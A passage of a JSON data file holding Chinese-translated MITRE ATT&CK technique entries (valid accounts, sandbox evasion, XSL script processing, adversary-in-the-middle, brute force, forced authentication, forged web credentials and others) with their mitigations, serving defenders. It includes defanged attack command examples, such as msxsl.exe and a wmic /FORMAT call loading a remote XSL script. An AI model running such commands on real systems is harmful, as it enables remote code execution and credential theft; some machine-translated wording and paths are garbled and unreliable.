                    "content": "身份验证过程通常需要有效身份（如用户名）以及一个或多个身份验证因素（如密码、密码、物理智能卡、令牌生成器等）。在用户或应用程序通过提供有效身份和所需身份验证因素成功进行身份验证后，系统会合法生成替代身份验证材料。在身份创建过程中也可以生成替代的认证材料。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "缓存备用身份验证材料允许系统验证身份是否已成功进行身份验证，而无需要求用户重新输入身份验证因素。因为备用身份验证必须由系统维护——无论是在内存中还是在磁盘上——它可能有通过凭据访问技术被盗的风险。通过窃取备用身份验证材料，对手能够绕过系统访问控制，在不知道明文密码或任何其他身份验证因素的情况下对系统进行身份验证。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制系统之间的凭证重叠，以防止凭证泄露造成的损害，并降低对手在系统之间进行横向移动的能力。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "执行最低特权原则。不允许域用户位于多个系统上的本地管理员组中。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1078",
        "name": "Valid Accounts",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            },
            {
                "id": "TA0001",
                "name": "Initial Access"
            }
        ],
        "subs": [
            {
                "id": "T1078.001",
                "name": "Default Accounts"
            },
            {
                "id": "T1078.002",
                "name": "Domain Accounts"
            },
            {
                "id": "T1078.003",
                "name": "Local Accounts"
            },
            {
                "id": "T1078.004",
                "name": "Cloud Accounts"
            }
        ],
        "version": "2.6",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会获取并滥用现有帐户的凭据，以此作为获得初始访问、持久性、特权提升或防御规避的手段。泄露的凭证可用于绕过网络内系统上各种资源上的访问控制，甚至可用于持久访问远程系统和外部可用服务，如VPN、Outlook Web access、网络设备和远程桌面。泄露的证书还可以向对手授予对特定系统的增加的特权或对网络的受限区域的访问。敌人可能会选择不将恶意软件或工具与这些凭据提供的合法访问结合使用，从而更难检测到它们的存在。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在某些情况下，对手可能会滥用非活动帐户：例如，那些属于不再是组织成员的个人的帐户。使用这些帐户可能会使对手逃避检测，因为原始帐户用户将不会在场以识别其帐户上发生的任何异常活动。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "本地、域和云帐户在系统网络上的权限重叠令人担忧，因为对手可能能够在帐户和系统之间切换，以达到高级别的访问（即域或企业管理员），从而绕过企业内设置的访问控制。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1036",
                "name": "帐户使用策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用条件访问策略阻止来自不兼容设备或来自定义的组织IP范围之外的登录。"
                        }
                    ]
                ]
            },
            {
                "id": "M1015",
                "name": "Active Directory配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "禁用不支持MFA的传统身份验证，并要求使用现代身份验证协议。"
                        }
                    ]
                ]
            },
            {
                "id": "M1013",
                "name": "应用程序开发人员指南",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保应用程序不会不安全地存储敏感数据或凭据。（例如，代码中的明文凭据、存储库中已发布的凭据或公共云存储中的凭据）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用默认用户名和密码的应用程序和设备应在安装后以及部署到生产环境之前立即进行更改。在可能的情况下，应定期更新使用SSH密钥的应用程序，并确保其安全。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "策略应尽量减少（如果不能消除的话）不同用户帐户之间密码的重复使用，尤其是对可能不受企业安全资源保护的个人帐户使用相同凭据的员工。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期审核域和本地帐户及其权限级别，以寻找可能允许对手通过获取特权帐户的凭据获得广泛访问权限的情况。这些审计还应包括是否已启用默认帐户，或者是否创建了未经授权的新本地帐户。遵循企业网络设计和管理的最佳实践，以限制跨管理层的特权帐户使用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期审核用户帐户的活动，并停用或删除任何不再需要的帐户。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "应用程序可以发送推送通知以验证作为多因素身份验证（MFA）形式的登录。培训用户只接受有效的推送通知并报告可疑的推送消息。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1497",
        "name": "Virtualization/Sandbox Evasion",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [
            {
                "id": "T1497.001",
                "name": "System Checks"
            },
            {
                "id": "T1497.002",
                "name": "User Activity Based Checks"
            },
            {
                "id": "T1497.003",
                "name": "Time Based Evasion"
            }
        ],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以采用各种手段来检测和避免虚拟化和分析环境。这可以包括基于对指示虚拟机环境（VME）或沙箱的工件的存在的检查结果来改变行为。如果对手检测到VME，他们可能会更改其恶意软件以脱离受害者或隐藏植入物的核心功能。它们还可以在丢弃次要或附加有效载荷之前搜索VME工件。在自动发现过程中，对手可能会使用从虚拟化/沙盒规避中学到的信息来塑造后续行为。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以使用多种方法来实现虚拟化/沙盒规避，例如检查安全监控工具（例如Sysinternals、Wireshark等）或与分析或虚拟化相关的其他系统工件。对手还可以检查合法的用户活动，以帮助确定它是否处于分析环境中。其他方法包括在恶意软件代码中使用睡眠定时器或循环，以避免在临时沙箱中操作。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1600",
        "name": "Weaken Encryption",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1600.001",
                "name": "Reduce Key Space"
            },
            {
                "id": "T1600.002",
                "name": "Disable Crypto Hardware"
            }
        ],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会损害网络设备的加密能力，以绕过原本可以保护数据通信的加密。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "加密可用于保护传输的网络流量，以保持其机密性（防止未经授权的披露）和完整性（防止非授权的更改）。加密密码用于将明文消息转换为密文，并且在没有相关解密密钥的情况下解密可能是计算密集型的。通常，较长的密钥会增加密码分析或在没有密钥的情况下解密的成本。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以破坏和操纵执行网络流量加密的设备。例如，通过修改系统映像、减少密钥空间和禁用加密硬件等行为，对手可能会对设备安全加密网络流量的能力产生负面影响和/或消除其能力。这会带来更大的未经授权披露风险，并可能有助于促进数据操作、凭据访问或收集工作。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1220",
        "name": "XSL Script Processing",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会通过在XSL文件中嵌入脚本来绕过应用程序控制并模糊代码的执行。可扩展样式表语言（XSL）文件通常用于描述XML文件中数据的处理和呈现。为了支持复杂的操作，XSL标准包括对各种语言的嵌入式脚本的支持。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用此功能来执行任意文件，同时可能会绕过应用程序控制。与Trusted Developer Utilities Proxy Execution类似，Microsoft公共行转换实用程序二进制文件（msxsl.exe）可以安装并用于执行嵌入本地或远程（URL引用）XSL文件中的恶意JavaScript。由于默认情况下不会安装msxsl.exe，因此对手可能需要使用丢弃的文件对其进行打包。Msxsl.exe接受两个主要参数，一个XML源文件和一个XSL样式表。由于XSL文件是有效的XML，因此对手可能会调用同一XSL文件两次。当使用msxsl.exe时，对手也可能给XML/XSL文件提供任意的文件扩展名。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "命令行示例："
                }
            ],
            [
                {
                    "type": "list",
                    "content": "msxsl.exe客户[.]xml脚本[.]xsl"
                },
                {
                    "type": "list",
                    "content": "msxsl.exe脚本[.]xsl脚本[.]xsl"
                },
                {
                    "type": "list",
                    "content": "msxsl.exe脚本[.]jpeg脚本[.]jpeg"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "该技术的另一个变体，称为“Squiblytwo”，涉及使用Windows Management Instrumentation在XSL文件中调用JScript或VBScript。这项技术还可以执行本地/远程脚本，与Regsvr32/“Squiblydoo”类似，它利用了一个值得信赖的内置Windows工具。如果敌人使用/FORMAT开关，他们可能会滥用Windows Management Instrumentation中的任何别名。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "命令行示例："
                }
            ],
            [
                {
                    "type": "list",
                    "content": "本地文件：wmic进程列表/FORMAT:evil[.]xsl"
                },
                {
                    "type": "list",
                    "content": "远程文件：wmic os get/FORMAT:“https://example[.]com/evile[.]xsl”"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果msxsl.exe是不必要的，则阻止其执行以防止对手滥用。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1557",
        "name": "Adversary-in-the-Middle",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            },
            {
                "id": "TA0009",
                "name": "Collection"
            }
        ],
        "subs": [
            {
                "id": "T1557.001",
                "name": "LLMNR/NBT-NS Poisoning and SMB Relay"
            },
            {
                "id": "T1557.002",
                "name": "ARP Cache Poisoning"
            },
            {
                "id": "T1557.003",
                "name": "DHCP Spoofing"
            }
        ],
        "version": "2.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能试图使用中间对手（AiTM）技术将自己定位在两个或多个联网设备之间，以支持后续行为，如网络嗅探、传输数据操纵或重放攻击（利用凭据访问）。通过滥用可以确定网络流量的常见网络协议的特征（例如ARP、DNS、LLMNR等），对手可能会迫使设备通过对手控制的系统进行通信，从而收集信息或执行额外的操作。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "例如，对手可能会操纵受害者的DNS设置，以启用其他恶意活动，例如阻止/重定向用户访问合法网站和/或推送其他恶意软件。对手也可能操纵DNS并利用其地位来拦截用户凭据和会话cookie。降级攻击也可用于建立AiTM位置，例如通过协商不太安全、不推荐使用或较弱版本的通信协议（SSL/TLS）或加密算法。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手也可以利用AiTM位置来尝试监控和/或修改流量，例如在传输数据操作中。敌人可以设置类似于AiTM的位置，以防止流量流向适当的目的地，可能会损害防御和/或支持网络拒绝服务。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "禁用可能用于拦截网络流量的遗留网络协议（如果适用），尤其是环境中不需要的协议。"
                        }
                    ]
                ]
            },
            {
                "id": "M1041",
                "name": "加密敏感信息",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保所有有线和/或无线通信都经过适当加密。使用Kerberos等身份验证协议的最佳实践，并确保可能包含凭据的web流量受到SSL/TLS的保护。"
                        }
                    ]
                ]
            },
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络设备和基于主机的安全软件来阻止环境中不必要的网络流量，例如可用于AiTM条件的遗留协议。"
                        }
                    ]
                ]
            },
            {
                "id": "M1035",
                "name": "限制通过网络访问资源",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制对可用于重塑流量或以其他方式产生AiTM条件的网络基础设施和资源的访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "可以识别指示AiTM活动的流量模式的网络入侵检测和预防系统可以用于减轻网络级别的活动。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "网络分段可用于隔离不需要广泛网络访问的基础设施组件。这可以减轻，或者至少减轻AiTM活动的范围。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "训练用户对证书错误持怀疑态度。对手可能会使用自己的证书试图拦截HTTPS流量。当应用程序的证书与主机期望的证书不匹配时，可能会出现证书错误。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1110",
        "name": "Brute Force",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            }
        ],
        "subs": [
            {
                "id": "T1110.001",
                "name": "Password Guessing"
            },
            {
                "id": "T1110.002",
                "name": "Password Cracking"
            },
            {
                "id": "T1110.003",
                "name": "Password Spraying"
            },
            {
                "id": "T1110.004",
                "name": "Credential Stuffing"
            }
        ],
        "version": "2.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "当密码未知或获得密码哈希时，攻击者可能会使用暴力技术访问帐户。在不知道一个帐户或一组帐户的密码的情况下，对手可能会使用重复或迭代机制系统地猜测密码。强制使用密码可以通过与服务的交互进行，该服务将检查这些凭据的有效性，也可以根据以前获取的凭据数据（如密码哈希）离线。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在违规过程中，可能会在不同的时间点上发生强行出示证书的行为。例如，对手可能试图利用从其他妥协后行为（如操作系统凭据转储、帐户发现或密码策略发现）收集的知识，在受害者环境中强行访问有效帐户。作为初始访问的一部分，敌人还可以将暴力行为与外部远程服务等行为相结合。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1036",
                "name": "帐户使用策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在尝试登录失败一定次数后设置帐户锁定策略，以防止猜测密码。过于严格的策略可能会造成拒绝服务的情况，并导致环境不可用，暴力中使用的所有帐户都会被锁定。使用条件访问策略阻止来自不兼容设备或来自定义的组织IP范围之外的登录。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用多因素身份验证。在可能的情况下，还可以对面向外部的服务启用多因素身份验证。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "创建密码策略时，请参阅NIST指南。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "主动重置已知是被破坏凭据一部分的帐户，可以立即重置，也可以在检测到恶意尝试后重置。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1555",
        "name": "Credentials from Password Stores",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            }
        ],
        "subs": [
            {
                "id": "T1555.001",
                "name": "Keychain"
            },
            {
                "id": "T1555.002",
                "name": "Securityd Memory"
            },
            {
                "id": "T1555.003",
                "name": "Credentials from Web Browsers"
            },
            {
                "id": "T1555.004",
                "name": "Windows Credential Manager"
            },
            {
                "id": "T1555.005",
                "name": "Password Managers"
            },
            {
                "id": "T1555.006",
                "name": "Cloud Secrets Management Stores"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以搜索常见的密码存储位置以获得用户凭据。密码存储在系统的多个位置，具体取决于持有凭据的操作系统或应用程序。还有一些特定的应用程序和服务可以存储密码，使用户更容易管理和维护密码，例如密码管理器和云机密库。一旦获得证书，它们就可以用于进行横向移动和访问受限信息。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "用户登录密钥链的密码可以从用户的登录密码更改。这增加了对手的复杂性，因为他们需要知道额外的密码。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "组织可以考虑权衡在密码存储和网络浏览器中存储凭据的风险。如果系统、软件或web浏览器凭据泄露是一个重大问题，则可以使用技术控制、策略和用户培训来防止凭据存储在不适当的位置。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将具有从密码存储中查询信息的权限的帐户和服务的数量限制为仅限所需的数量。确保具有查询密码存储权限的帐户和服务只能访问它们所需的机密。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1212",
        "name": "Exploitation for Credential Access",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            }
        ],
        "subs": [],
        "version": "1.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会利用软件漏洞来收集凭据。当对手利用程序、服务或操作系统软件或内核本身中的编程错误来执行对手控制的代码时，就会发生软件漏洞的利用。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "认证和身份验证机制可能会被对手利用，作为获得有用证书访问权限或绕过获得系统身份验证访问权限的手段。其中一个例子是"
                },
                {
                    "type": "code",
                    "content": "MS14-068"
                },
                {
                    "type": "text",
                    "content": "，它以Kerberos为目标，可用于使用域用户权限伪造Kerberos票证。另一个例子是重放攻击，在重放攻击中，对手截获各方之间发送的数据包，然后再重放这些数据包。如果服务不能正确验证身份验证请求，这些重放的数据包可能会允许对手模拟其中一方，并获得未经授权的访问或权限。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "这种利用在云环境中也得到了证明。例如，对手利用了公共云基础设施中的漏洞，这些漏洞允许意外创建和更新身份验证令牌。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "利用凭据访问还可能导致特权升级，具体取决于目标进程或获得的凭据。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1013",
                "name": "应用程序开发人员指南",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "应用程序开发人员应考虑采取措施，通过启用一次性密码、为发送的消息提供时间戳或序列号、使用数字签名和/或使用随机会话密钥来验证身份验证请求。"
                        }
                    ]
                ]
            },
            {
                "id": "M1048",
                "name": "应用程序隔离和沙盒",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过使用沙箱利用未发现或未修补的漏洞，使对手难以推进行动。其他类型的虚拟化和应用程序细分也可以减轻某些类型的利用带来的影响。这些系统中可能仍然存在其他漏洞和弱点的风险。"
                        }
                    ]
                ]
            },
            {
                "id": "M1050",
                "name": "利用漏洞保护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "查找利用漏洞期间使用的行为的安全应用程序，如Windows Defender Exploit Guard（WDEG）和增强型缓解体验工具包（EMET），可用于缓解某些利用行为。控制流完整性检查是另一种可能识别和阻止软件利用的方法。其中许多保护依赖于体系结构和目标应用程序二进制文件的兼容性，可能不适用于以防御规避为目标的软件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1019",
                "name": "威胁情报计划",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "开发强大的网络威胁情报能力，以确定哪些类型和级别的威胁可能使用软件攻击，以及针对特定组织的0天。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过对内部企业端点和服务器使用补丁管理，定期更新软件。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1187",
        "name": "Forced Authentication",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            }
        ],
        "subs": [],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以通过调用或强制用户通过他们可以拦截的机制自动提供认证信息来收集凭证材料。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "服务器消息块（SMB）协议通常在Windows网络中用于系统之间的身份验证和通信，以访问资源和文件共享。当Windows系统尝试连接到SMB资源时，它将自动尝试验证当前用户的凭据信息并将其发送到远程系统。这种行为在企业环境中很常见，因此用户无需输入凭据即可访问网络资源。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "当SMB被阻止或出现故障时，Web分布式创作和版本控制（WebDAV）通常也被Windows系统用作备份协议。WebDAV是HTTP的扩展，通常通过TCP端口80和443进行操作。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可能会利用这种行为，通过强制SMB/WebDAV身份验证来访问用户帐户哈希。对手可以通过鱼叉式网络钓鱼向用户发送附件，该附件包含指向对手控制的外部服务器的资源链接（即模板注入），或者将特制的文件放在特权帐户的导航路径上（例如放在桌面上的.SCF文件）或放在受害者可访问的公共共享上。当用户的系统访问不受信任的资源时，它将尝试进行身份验证，并通过SMB向对手控制的服务器发送信息，包括用户的哈希凭证。通过访问凭据哈希，对手可以执行离线Brute Force破解，以获得对明文凭据的访问权限。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "这种情况有几种不同的发生方式。野外使用的一些细节包括："
                }
            ],
            [
                {
                    "type": "list",
                    "content": "一种鱼叉式网络钓鱼附件，其中包含一个文档，该文档在打开时会自动加载资源（即模板注入）。例如，文档可以包括类似于文件[：]/[远程地址]/Normal.dotm的请求，以触发SMB请求。"
                },
                {
                    "type": "list",
                    "content": "一个修改过的。LNK或。SCF文件，其图标文件名指向外部引用，如\\[远程地址]\\pic.png，当图标被呈现以重复收集凭据时，该文件将强制系统加载资源。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过出口过滤或通过阻止TCP端口139、445和UDP端口137来阻止SMB流量退出企业网络。过滤或阻止WebDAV协议流量退出网络。如果需要通过SMB和WebDAV访问外部资源，则应使用allowlisting严格限制流量。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用强密码可以增加凭据哈希在获得后被破解的难度。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1606",
        "name": "Forge Web Credentials",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            }
        ],
        "subs": [
            {
                "id": "T1606.001",
                "name": "Web Cookies"
            },
            {
                "id": "T1606.002",
                "name": "SAML Tokens"
            }
        ],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会伪造可用于访问网络应用程序或互联网服务的凭证材料。Web应用程序和服务（托管在云SaaS环境或内部部署服务器中）通常使用会话cookie、令牌或其他材料来验证和授权用户访问。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会生成这些凭证材料，以便访问网络资源。这与窃取Web会话Cookie、窃取应用程序访问令牌和其他类似行为的不同之处在于，凭据是新的，由对手伪造，而不是从合法用户那里窃取或拦截。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "web凭据的生成通常需要秘密值，如密码、私钥或其他加密种子值。对手还可以利用AWS中的"
                },
                {
                    "type": "code",
                    "content": "AssumeRole"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "GetFederationToken"
                },
                {
                    "type": "text",
                    "content": "API等功能伪造代币，这些功能允许用户请求临时安全凭据（即临时提升的云访问），或Zimbra中的"
                },
                {
                    "type": "code",
                    "content": "zmprov gdpak"
                },
                {
                    "type": "text",
                    "content": "命令，其生成可用于为域中的任何用户生成令牌的预认证密钥。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "一旦被伪造，对手可能会使用这些网络凭据访问资源（例如：使用备用身份验证材料），这可能会绕过多因素和其他身份验证保护机制。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "管理员应审核所有访问列表以及授予他们访问web应用程序和服务的权限。应在所有资源上广泛开展这项工作，以建立一个基线，随后对新的或更新的资源进行定期审计。应调查并删除可疑帐户/凭证。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "在ADFS上启用高级审核。检查ADFS管理单元中的成功和失败审核选项。通过组策略对象在AD FS场上启用审核应用程序生成的事件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将对AD FS服务器的权限和访问限制为仅来自特权访问工作站。"
                        }
                    ]
                ]
            },
            {
                "id": "M1054",
                "name": "软件配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "配置浏览器/应用程序以定期删除持久的web凭据（如cookie）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保具有管理权限的用户帐户遵循最佳做法，包括使用特权访问工作站、实时/足够管理（JIT/JEA）和强身份验证。减少高特权目录角色成员的用户数量。在AWS环境中，除非明确要求，否则禁止用户调用"
                        },
                        {
                            "type": "code",
                            "content": "sts:GetFederationToken"
                        },
                        {
                            "type": "text",
                            "content": "API。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1056",
        "name": "Input Capture",
        "tactics": [
            {
                "id": "TA0009",
                "name": "Collection"
            },
            {
                "id": "TA0006",
                "name": "Credential Access"
            }
        ],
        "subs": [
            {
                "id": "T1056.001",
                "name": "Keylogging"
            },
            {
                "id": "T1056.002",
                "name": "GUI Input Capture"
            },
            {
                "id": "T1056.003",
                "name": "Web Portal Capture"
            },
            {
                "id": "T1056.004",
                "name": "Credential API Hooking"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以使用捕获用户输入的方法来获得证书或收集信息。在正常的系统使用过程中，用户通常会向各种不同的位置提供凭据，例如登录页面/门户或系统对话框。输入捕获机制可能对用户是透明的（例如凭证API挂钩），或者依赖于欺骗用户提供他们认为是真实服务的输入（例如门户捕获）。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1556",
        "name": "Modify Authentication Process",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            },
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [
            {
                "id": "T1556.001",
                "name": "Domain Controller Authentication"
            },
            {
                "id": "T1556.002",
                "name": "Password Filter DLL"
            },
            {
                "id": "T1556.003",
                "name": "Pluggable Authentication Modules"
            },
            {
                "id": "T1556.004",
                "name": "Network Device Authentication"
            },
            {
                "id": "T1556.005",
                "name": "Reversible Encryption"
            },
            {
                "id": "T1556.006",
                "name": "Multi-Factor Authentication"
            },
            {
                "id": "T1556.007",
                "name": "Hybrid Identity"
            },
            {
                "id": "T1556.008",
                "name": "Network Provider DLL"
            }
        ],
        "version": "2.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会修改身份验证机制和过程以访问用户凭据，或以其他方式对帐户进行不必要的访问。身份验证过程由一些机制处理，如Windows上的本地安全身份验证服务器（LSASS）过程和安全帐户管理器（SAM），基于Unix的系统上的可插入身份验证模块（PAM），以及MacOS系统上负责收集、存储和验证凭据的授权插件。通过修改身份验证过程，对手可以在不使用有效帐户的情况下对服务或系统进行身份验证。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可能会恶意修改此过程的一部分，以显示凭据或绕过身份验证机制。泄露的凭证或访问可用于绕过网络内系统上各种资源上的访问控制，甚至可用于持久访问远程系统和外部可用服务，如VPN、Outlook Web access和远程桌面。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "审查身份验证日志，以确保MFA强制执行等机制按预期运行。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "定期检查正在使用的混合身份解决方案是否存在任何差异。例如，查看Azure管理门户中的所有直通身份验证（PTA）代理，以识别任何不需要或未批准的代理。如果正在使用ADFS，请检查AD FS和全局程序集缓存目录中的DLL和可执行文件，以确保它们由Microsoft签名。请注意，在某些情况下，二进制文件可能是经过目录签名的，这可能会导致在查看文件属性时文件显示为未签名。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "定期检查注册表中新的和未知的网络提供程序DLL（"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<NetworkProviderName>\\NetworkProvider\\ProviderPath"
                        },
                        {
                            "type": "text",
                            "content": "）。请确保仅注册了有效的网络提供程序DLL。这些服务的名称可以在注册表项的"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order中找到，并且相应的服务子项指向HKEY_LOCAL_MACHINE\\SSYSTEM\\CurrentC ontrolSet\\Services\\<NetworkProviderName>\\NetworkProvider"
                        },
                        {
                            "type": "text",
                            "content": "中的DLL。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将多因素身份验证（MFA）作为组织策略的一部分进行集成，可以大大降低对手获得有效证书控制权的风险，这些证书可用于其他策略，如初始访问、横向移动和收集信息。MFA还可以用于限制对云资源和API的访问。"
                        }
                    ]
